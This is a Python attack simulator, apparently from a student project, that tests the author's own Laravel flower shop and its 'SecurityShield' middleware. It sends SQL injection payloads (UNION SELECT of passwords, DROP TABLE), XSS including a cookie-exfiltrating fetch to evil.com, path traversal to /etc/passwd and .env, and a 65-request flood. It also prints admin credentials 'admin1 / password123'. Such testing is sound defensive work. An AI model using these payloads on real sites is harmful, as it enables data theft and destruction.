#!/usr/bin/env python3
# =============================================================================
#  REAL ATTACK SIMULATOR - Gửi tấn công thật qua Laravel (port 8000)
#  SecurityShield middleware sẽ bắt và ghi log vào database
#  Chạy: py real_attack_sim.py
# =============================================================================

import sys
import io
import os
import time
import subprocess

if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

import requests
from datetime import datetime

LARAVEL_URL = "https://abc123.ngrok-free.app" 
LARAVEL_DIR = r"d:\LongWork\BMUD-BTL\SystemSafetyandSecurity"

RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def print_header():
    print()
    print(RED + BOLD + "=" * 70 + RESET)
    print(RED + BOLD + "  [ROSESHOP] REAL ATTACK SIMULATOR - Tan cong qua Laravel" + RESET)
    print(RED + BOLD + "  SecurityShield se bat va ghi log vao database Aiven MySQL" + RESET)
    print(RED + BOLD + "=" * 70 + RESET)
    print(f"\n  {CYAN}Target:{RESET} {LARAVEL_URL}")
    print(f"  {CYAN}Thoi gian:{RESET} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

def check_laravel():
    try:
        r = requests.get(LARAVEL_URL, timeout=15)
        print(f"{GREEN}[OK] Laravel dang ONLINE tai {LARAVEL_URL}{RESET}")
        return True
    except requests.exceptions.Timeout:
        print(f"{RED}[ERR] Laravel TIMEOUT (Aiven SSL chậm) - thu lai...{RESET}")
        # Thu lan 2
        try:
            r = requests.get(LARAVEL_URL, timeout=20)
            print(f"{GREEN}[OK] Laravel ONLINE (lan 2){RESET}")
            return True
        except:
            print(f"{RED}[ERR] Laravel OFFLINE! Hay kiem tra php artisan serve{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[ERR] Laravel OFFLINE! {e}{RESET}")
        return False

def clear_ip_block():
    """Xoa IP block trong Laravel cache de tiep tuc tan cong"""
    try:
        result = subprocess.run(
            ["php", "artisan", "cache:clear"],
            cwd=LARAVEL_DIR, capture_output=True, text=True, timeout=10
        )
        print(f"  {YELLOW}[CACHE CLEARED] Da giai phong IP block - san sang tan cong tiep!{RESET}\n")
    except Exception as e:
        print(f"  {YELLOW}[WARN] Khong clear duoc cache: {e}{RESET}\n")

def send_attack(name, url, method="GET", params=None, data=None, expected_block=True):
    """Gui 1 request tan cong va hien thi ket qua"""
    full_url = f"{LARAVEL_URL}{url}"
    try:
        if method == "GET":
            r = requests.get(full_url, params=params, timeout=5, allow_redirects=False)
        else:
            r = requests.post(full_url, data=data, timeout=5, allow_redirects=False)

        status = r.status_code
        if status == 403:
            result = f"{RED}[BLOCKED 403]{RESET} SecurityShield chan thanh cong!"
            logged = True
        elif status == 429:
            result = f"{RED}[BLOCKED 429]{RESET} Rate Limit - IP bi chan!"
            logged = True
        elif status in [200, 302]:
            result = f"{YELLOW}[PASSED {status}]{RESET} Request da qua (AI co the ghi LOG_ONLY)"
            logged = True  # SecurityShield van ghi log du co block hay khong
        else:
            result = f"{CYAN}[STATUS {status}]{RESET}"
            logged = False

        icon = "=>" if logged else "  "
        print(f"  {MAGENTA}[{name}]{RESET}")
        print(f"    URL: {url}")
        print(f"    Ket qua: {result}")
        print()

    except requests.exceptions.ConnectionError:
        print(f"  {RED}[ERR] Khong ket noi duoc Laravel{RESET}\n")
    except Exception as e:
        print(f"  {RED}[ERR] {e}{RESET}\n")

    time.sleep(0.5)

def section(title):
    print(f"\n{BLUE}{BOLD}{'=' * 70}{RESET}")
    print(f"{BLUE}{BOLD}  {title}{RESET}")
    print(f"{BLUE}{BOLD}{'=' * 70}{RESET}\n")

# ─── MODULE 1: SQL Injection ──────────────────────────────────────────────────
def attack_sqli():
    section("MODULE 1: SQL Injection Attacks")
    attacks = [
        ("SQLi - OR bypass",          "/customer/hoa-tuoi", "GET",  {"search": "' OR '1'='1"}, None),
        ("SQLi - UNION SELECT",       "/customer/hoa-tuoi", "GET",  {"search": "1 UNION SELECT ten_dang_nhap,mat_khau FROM nguoi_dung --"}, None),
        ("SQLi - DROP TABLE",         "/customer/hoa-tuoi", "GET",  {"search": "'; DROP TABLE nguoi_dung; --"}, None),
        ("SQLi - Subquery extract",   "/customer/hoa-tuoi", "GET",  {"search": "1 AND (SELECT mat_khau FROM nguoi_dung LIMIT 1)='abc'"}, None),
    ]
    for name, url, method, params, data in attacks:
        send_attack(name, url, method, params, data)
        clear_ip_block()  # giai phong IP sau moi request

# ─── MODULE 2: XSS ───────────────────────────────────────────────────────────
def attack_xss():
    section("MODULE 2: Cross-Site Scripting (XSS) Attacks")
    attacks = [
        ("XSS - Script tag",          "/customer/hoa-tuoi", "GET", {"search": "<script>alert(document.cookie)</script>"}, None),
        ("XSS - IMG onerror",         "/customer/hoa-tuoi", "GET", {"search": "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>"}, None),
        ("XSS - SVG payload",         "/customer/hoa-tuoi", "GET", {"search": "<svg/onload=alert(1)>"}, None),
        ("XSS - javascript: href",    "/customer/hoa-tuoi", "GET", {"search": "javascript:alert('XSS')"}, None),
    ]
    for name, url, method, params, data in attacks:
        send_attack(name, url, method, params, data)
        clear_ip_block()  # giai phong IP sau moi request

# ─── MODULE 3: Path Traversal ─────────────────────────────────────────────────
def attack_path_traversal():
    section("MODULE 3: Path Traversal Attacks")
    attacks = [
        ("Path Traversal - /etc/passwd",    "/customer/hoa-tuoi", "GET", {"file": "../../../../etc/passwd"}, None),
        ("Path Traversal - .env file",       "/customer/hoa-tuoi", "GET", {"file": "../../.env"}, None),
        ("Path Traversal - win.ini",         "/customer/hoa-tuoi", "GET", {"file": "..\\..\\..\\windows\\win.ini"}, None),
    ]
    for name, url, method, params, data in attacks:
        send_attack(name, url, method, params, data)
        clear_ip_block()  # giai phong IP sau moi request

# ─── MODULE 4: DOS / Brute-Force ─────────────────────────────────────────────
def attack_dos():
    section("MODULE 4: DOS / Rate Limit Attack (65 requests lien tiep)")
    print(f"  {YELLOW}Dang gui 65 request lien tiep den /customer/hoa-tuoi...{RESET}\n")

    blocked_at = None
    for i in range(1, 66):
        try:
            r = requests.get(f"{LARAVEL_URL}/customer/hoa-tuoi", timeout=3)
            if r.status_code == 429 and blocked_at is None:
                blocked_at = i
                print(f"  {RED}{BOLD}[BLOCKED 429]{RESET} Bi chan tai request thu {i}/65!")
                print(f"  IP da bi lock trong cache 1 gio!")
                break
            elif i % 10 == 0:
                print(f"  [{i}/65] Status: {r.status_code} - Chua bi chan...")
        except:
            print(f"  [{i}] Connection refused - co the da bi chan!")
            blocked_at = i
            break
        time.sleep(0.05)

    if not blocked_at:
        print(f"  {YELLOW}Da gui xong 65 requests. Kiem tra dashboard de xem log.{RESET}")
    print()

# ─── SUMMARY ─────────────────────────────────────────────────────────────────
def print_summary():
    print(f"\n{GREEN}{BOLD}{'=' * 70}")
    print(f"  TAN CONG HOAN TAT!")
    print(f"{'=' * 70}{RESET}")
    print(f"""
  {CYAN}Ket qua ghi vao database:{RESET}
  - SecurityShield middleware da xu ly tat ca request
  - Cac tan cong bi phat hien duoc ghi vao bang security_logs
  - IP bi chan luu vao Laravel Cache

  {CYAN}Xem ket qua tai:{RESET}
  - {BOLD}Security Logs:{RESET}      http://127.0.0.1:8000/admin/security/logs
  - {BOLD}Security Dashboard:{RESET} http://127.0.0.1:8000/admin/security/dashboard
  - {BOLD}Bao cao AI:{RESET}         http://127.0.0.1:8000/admin/security/reports

  {YELLOW}Luu y: Neu ban bi ban khoi web sau khi tan cong,{RESET}
  {YELLOW}dang nhap lai bang admin1 / password123{RESET}
""")

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    print_header()

    if not check_laravel():
        return

    print(f"\n{BOLD}Chon Module Tan Cong:{RESET}")
    print(f"  {CYAN}1{RESET} - SQL Injection (5 payload)")
    print(f"  {CYAN}2{RESET} - XSS (4 payload)")
    print(f"  {CYAN}3{RESET} - Path Traversal (3 payload)")
    print(f"  {CYAN}4{RESET} - DOS / Rate Limit (65 requests)")
    print(f"  {CYAN}0{RESET} - Chay TAT CA (SQLi + XSS + Path Traversal + DOS)")
    print()

    choice = input(f"{BOLD}Nhap lua chon (0/1/2/3/4): {RESET}").strip()

    if choice == "1":
        attack_sqli()
    elif choice == "2":
        attack_xss()
    elif choice == "3":
        attack_path_traversal()
    elif choice == "4":
        attack_dos()
    elif choice == "0":
        attack_sqli()
        attack_xss()
        attack_path_traversal()
        attack_dos()
    else:
        print(f"{YELLOW}Lua chon khong hop le, chay tat ca...{RESET}")
        attack_sqli()
        attack_xss()
        attack_path_traversal()

    print_summary()

if __name__ == "__main__":
    main()
